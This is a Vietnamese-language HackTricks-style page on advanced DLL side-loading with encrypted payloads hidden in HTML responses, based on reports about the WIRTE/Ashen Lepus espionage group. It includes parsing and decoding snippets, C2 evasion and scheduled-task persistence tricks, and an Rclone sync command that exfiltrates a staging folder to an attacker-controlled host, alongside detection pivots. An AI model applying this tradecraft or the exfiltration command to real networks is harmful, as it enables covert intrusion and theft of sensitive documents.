# Advanced DLL Side-Loading Với Staging Payload Nhúng Trong HTML

{{#include ../../../banners/hacktricks-training.md}}

## Tổng quan Tradecraft

Ashen Lepus (còn gọi là WIRTE) đã vũ khí hóa một mô hình có thể lặp lại, kết hợp DLL sideloading, payload HTML theo từng giai đoạn và backdoor .NET dạng mô-đun để duy trì hiện diện trong các mạng ngoại giao ở Trung Đông. Bất kỳ operator nào cũng có thể tái sử dụng kỹ thuật này vì nó dựa vào:<sup>[[1]](#references)</sup>

- **Social engineering dựa trên archive**: các PDF lành tính hướng dẫn mục tiêu tải một archive RAR từ trang chia sẻ file. Archive bao gồm một EXE trình xem tài liệu trông có vẻ đáng tin, một DLL độc hại được đặt tên theo một thư viện đáng tin cậy (ví dụ: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) và một file mồi `Document.pdf`.
- **Lạm dụng thứ tự tìm kiếm DLL**: nạn nhân nhấp đúp vào EXE, Windows phân giải import DLL từ thư mục hiện tại, rồi loader độc hại (AshenLoader) thực thi bên trong tiến trình đáng tin cậy trong khi PDF mồi mở ra để tránh gây nghi ngờ.
- **Staging Living-off-the-land**: mọi stage tiếp theo (AshenStager → AshenOrchestrator → các module) đều không được lưu trên đĩa cho đến khi cần; chúng được phân phối dưới dạng blob đã mã hóa, ẩn trong các phản hồi HTML vốn vô hại.

## Chuỗi Side-Loading Nhiều Giai đoạn

1. **EXE mồi → AshenLoader**: EXE sideload AshenLoader, thành phần này do thám host, mã hóa dữ liệu bằng AES-CTR rồi POST dữ liệu bên trong các tham số luân phiên như `token=`, `id=`, `q=`, hoặc `auth=` đến các đường dẫn trông giống API (ví dụ: `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Trích xuất HTML**: C2 chỉ tiết lộ stage tiếp theo khi IP của client được định vị địa lý thuộc khu vực mục tiêu và `User-Agent` khớp với implant, khiến sandbox khó phát hiện hơn. Khi các bước kiểm tra đạt yêu cầu, phần thân HTTP chứa một blob `<headerp>...</headerp>` với payload AshenStager được mã hóa bằng Base64/AES-CTR.
3. **Sideload lần hai**: AshenStager được triển khai cùng một binary hợp pháp khác có import `wtsapi32.dll`. Bản sao độc hại được inject vào binary sẽ tải thêm HTML, lần này trích nội dung `<article>...</article>` để khôi phục AshenOrchestrator.
4. **AshenOrchestrator**: một controller .NET dạng mô-đun giải mã cấu hình JSON Base64. Các trường `tg` và `au` trong config được nối/hash thành khóa AES, dùng để giải mã `xrk`. Các byte thu được làm khóa XOR cho mọi blob module được tải sau đó.
5. **Phân phối module**: mỗi module được mô tả bằng các comment HTML chuyển hướng parser đến một tag tùy ý, qua đó phá vỡ các quy tắc static chỉ tìm `<headerp>` hoặc `<article>`. Các module bao gồm persistence (`PR*`), trình gỡ cài đặt (`UN*`), do thám (`SN`), chụp màn hình (`SCT`) và khám phá file (`FE`).

### Mô hình Phân tích Container HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Ngay cả khi bên phòng thủ chặn hoặc loại bỏ một phần tử cụ thể, operator chỉ cần thay đổi thẻ được gợi ý trong chú thích HTML để tiếp tục phân phối.<sup>[[1]](#references)</sup>

### Trình hỗ trợ trích xuất nhanh (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Các điểm tương đồng trong né tránh bằng HTML staging

Nghiên cứu gần đây về HTML smuggling (Talos) nhấn mạnh payload được ẩn dưới dạng chuỗi Base64 bên trong các khối `<script>` trong tệp đính kèm HTML và được giải mã bằng JavaScript khi chạy.<sup>[[2]](#references)</sup> Có thể áp dụng thủ thuật tương tự cho phản hồi C2: stage các blob đã mã hóa bên trong thẻ script (hoặc phần tử DOM khác), rồi giải mã trong bộ nhớ trước khi dùng AES/XOR, khiến trang trông như HTML thông thường. Talos cũng cho thấy cách làm rối nhiều lớp (đổi tên định danh kết hợp Base64/Caesar/AES) bên trong thẻ script, phù hợp với các blob C2 được stage trong HTML.<sup>[[2]](#references)</sup> Một bài viết sau đó của Talos về **hidden text salting** cũng có liên quan: chỉ cần chia Base64 bằng các comment HTML hoặc khoảng trắng không liên quan là đủ để đánh lừa các bộ trích xuất regex đơn giản, trong khi việc tái tạo ở phía trình duyệt vẫn rất dễ dàng.<sup>[[7]](#references)</sup>

## Ghi chú về các biến thể gần đây (2024-2025)

- Check Point ghi nhận các chiến dịch WIRTE năm 2024 vẫn dựa vào sideloading qua archive, nhưng dùng `propsys.dll` (stagerx64) làm stage đầu tiên. Stager giải mã payload tiếp theo bằng Base64 + XOR (khóa `53`), gửi các HTTP request với `User-Agent` được hardcode và trích xuất các blob đã mã hóa được nhúng giữa các thẻ HTML. Ở một nhánh, stage được tái tạo từ một danh sách dài các chuỗi IP được nhúng, giải mã qua `RtlIpv4StringToAddressA`, rồi nối lại thành các byte của payload.<sup>[[3]](#references)</sup>
- OWN-CERT ghi nhận các công cụ WIRTE trước đó, trong đó dropper được sideload là `wtsapi32.dll` bảo vệ chuỗi bằng Base64 + TEA và dùng chính tên DLL làm khóa giải mã, sau đó làm rối dữ liệu nhận dạng máy chủ bằng XOR/Base64 trước khi gửi đến C2.<sup>[[4]](#references)</sup>

## Tái tạo các stage được mã hóa bằng IP

Nhánh `propsys.dll` năm 2024 của WIRTE cho thấy PE tiếp theo không nhất thiết phải nằm trong một blob HTML liên tục. Loader có thể lưu byte của stage dưới dạng các chuỗi dotted-quad rồi dựng lại bằng `RtlIpv4StringToAddressA`, một kỹ thuật gần với tradecraft **IPfuscation** của Hive.<sup>[[3]](#references)[[5]](#references)</sup> Về mặt vận hành, cách này hữu ích khi actor muốn trang HTML chứa những gì trông như IOC hoặc dữ liệu cấu hình vô hại thay vì một payload Base64 dễ nhận ra.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Nếu các byte được khôi phục bắt đầu bằng `MZ`, có khả năng bạn đã tái dựng trực tiếp PE tiếp theo. Nếu không, hãy kiểm tra xem có lớp XOR/Base64 ở đầu hoặc các đoạn phân cách nhỏ giữa các địa chỉ hay không.

## Tên DLL có thể thay thế & luân phiên host

Một đặc điểm nổi bật của mẫu này là **backend staging HTML/AES/XOR có thể giữ nguyên, trong khi chỉ cần thay đổi cặp sideload**. WIRTE đã luân phiên sử dụng `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` và `propsys.dll` qua các chiến dịch, điều này hữu ích vì:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` và `wtsapi32.dll` là những tên DLL Windows phổ biến mà các bên phòng thủ kỳ vọng sẽ tồn tại trong `%System32%` / `%SysWOW64%`.
- Các catalog công khai như **HijackLibs** đã lập bản đồ nhiều binary sẽ tải những tên DLL này từ thư mục ứng dụng được sao chép, cung cấp cho operator các host thay thế mà không cần thiết kế lại stager.
- Chỉ cần điều chỉnh export surface cho từng host. HTML parser, các routine AES/XOR và module loader thường có thể được chuyển nguyên vẹn vào một forwarding proxy DLL.

Đối với công việc trong lab offensive, điều này có nghĩa là bạn có thể chia bài toán thành **(1) tìm một host đã ký ổn định có thể phân giải cục bộ tên DLL bạn chọn** và **(2) tái sử dụng cùng logic loader HTML staging phía sau DLL đó**.

## Gia cố Crypto & C2

- **AES-CTR ở mọi nơi**: các loader hiện tại nhúng key 256-bit cùng nonce (ví dụ: `{9a 20 51 98 ...}`) và có thể thêm một lớp XOR sử dụng các chuỗi như `msasn1.dll` trước/sau khi giải mã.<sup>[[1]](#references)</sup>
- **Biến thể key material**: các loader trước đây sử dụng Base64 + TEA để bảo vệ các chuỗi nhúng, với key giải mã được suy ra từ tên DLL độc hại (ví dụ: `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Tách biệt hạ tầng + ngụy trang subdomain**: các staging server được tách riêng theo từng công cụ, lưu trữ trên nhiều ASN khác nhau và đôi khi được đặt phía trước các subdomain trông hợp pháp, nhờ đó việc lộ một stage không làm lộ phần còn lại.
- **Ngụy trang dữ liệu trinh sát**: dữ liệu được liệt kê hiện bao gồm danh sách Program Files để tìm các ứng dụng có giá trị cao và luôn được mã hóa trước khi rời khỏi host.
- **Luân phiên URI**: các query parameter và REST path thay đổi giữa các chiến dịch (`/api/v1/account?token=` → `/api/v2/account?auth=`), vô hiệu hóa các detection dễ bị phá vỡ.
- **Ghim User-Agent + redirect an toàn**: hạ tầng C2 chỉ phản hồi với các chuỗi UA chính xác, nếu không sẽ redirect đến các trang tin tức/sức khỏe lành tính để hòa lẫn vào lưu lượng bình thường.
- **Phân phối có kiểm soát**: server bị giới hạn theo vị trí địa lý và chỉ phản hồi với implant thật. Client không được phê duyệt sẽ nhận HTML không đáng ngờ.

## Persistence & vòng lặp thực thi

AshenStager tạo scheduled task giả dạng các tác vụ bảo trì Windows và thực thi thông qua `svchost.exe`, ví dụ:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Các task này khởi chạy lại chuỗi sideload khi khởi động hoặc theo các khoảng thời gian định sẵn, đảm bảo AshenOrchestrator có thể yêu cầu các module mới mà không cần ghi lại vào disk.

## Sử dụng sync client lành tính để exfiltration

Operator stage các tài liệu ngoại giao trong `C:\Users\Public` (mọi người dùng đều có thể đọc và không gây nghi ngờ) thông qua một module chuyên dụng, sau đó tải binary [Rclone](https://rclone.org/) hợp pháp để đồng bộ thư mục đó với kho lưu trữ của attacker. Unit42 ghi nhận đây là lần đầu tiên actor này được quan sát sử dụng Rclone để exfiltration, phù hợp với xu hướng rộng hơn là lạm dụng các công cụ đồng bộ hợp pháp để hòa lẫn vào lưu lượng bình thường:<sup>[[1]](#references)</sup>

1. **Stage**: sao chép/thu thập các file mục tiêu vào `C:\Users\Public\{campaign}\`.
2. **Cấu hình**: cung cấp cấu hình Rclone trỏ đến endpoint HTTPS do attacker kiểm soát (ví dụ: `api.technology-system[.]com`).
3. **Đồng bộ**: chạy `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` để lưu lượng trông giống các bản sao lưu cloud thông thường.

Vì Rclone được sử dụng rộng rãi trong các quy trình sao lưu hợp pháp, các bên phòng thủ cần tập trung vào những lần thực thi bất thường (binary mới, remote lạ hoặc đột ngột đồng bộ `C:\Users\Public`).

## Các điểm pivot để detection

- Cảnh báo khi **process đã ký** bất ngờ tải DLL từ các path cho phép người dùng ghi (bộ lọc Procmon + `Get-ProcessMitigation -Module`), đặc biệt khi tên DLL trùng với `netutils`, `srvcli`, `dwampi`, `wtsapi32` hoặc `propsys`.<sup>[[6]](#references)</sup>
- Kiểm tra các phản hồi HTTPS đáng ngờ để tìm **blob Base64 lớn được nhúng trong các tag bất thường** hoặc được bảo vệ bằng comment `<!-- TAG: <xyz> -->`.
- Chuẩn hóa HTML trước: **loại bỏ comment và thu gọn khoảng trắng trước khi trích xuất Base64**, vì kỹ thuật né tránh kiểu hidden-text-salting có thể chia payload qua ranh giới comment.
- Mở rộng hoạt động săn tìm trong HTML để phát hiện **chuỗi Base64 bên trong các khối `<script>`** (staging kiểu HTML smuggling) được giải mã bằng JavaScript trước khi xử lý AES/XOR.
- Tìm các lần gọi lặp lại **`RtlIpv4StringToAddressA` theo sau bởi quá trình ghép buffer**, đặc biệt khi các chuỗi xung quanh là danh sách IPv4 dài thay vì mục tiêu mạng thực.
- Tìm **scheduled task** chạy `svchost.exe` với các đối số không liên quan đến service hoặc trỏ ngược về các thư mục dropper.
- Theo dõi **redirect C2** chỉ trả payload cho các chuỗi `User-Agent` chính xác và trong các trường hợp khác thì chuyển hướng đến các domain tin tức/sức khỏe hợp pháp.
- Giám sát **binary Rclone** xuất hiện bên ngoài các vị trí do bộ phận IT quản lý, các file `rclone.conf` mới hoặc các job đồng bộ lấy dữ liệu từ thư mục staging như `C:\Users\Public`.

## References

- [1] [Ashen Lepus có liên hệ với Hamas nhắm vào các cơ quan ngoại giao Trung Đông bằng bộ malware AshTag mới](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Ẩn giữa các thẻ: Những hiểu biết về kỹ thuật né tránh trong HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Threat Actor WIRTE có liên hệ với Hamas tiếp tục hoạt động ở Trung Đông và chuyển sang các hoạt động gây gián đoạn](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: Tìm kiếm thời gian đã mất](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware triển khai kỹ thuật IPfuscation mới lạ để tránh detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Khả năng DLL hệ thống bị sideload từ các vị trí không phải hệ thống](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Thêm gia vị cho các mối đe dọa qua email bằng kỹ thuật hidden-text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
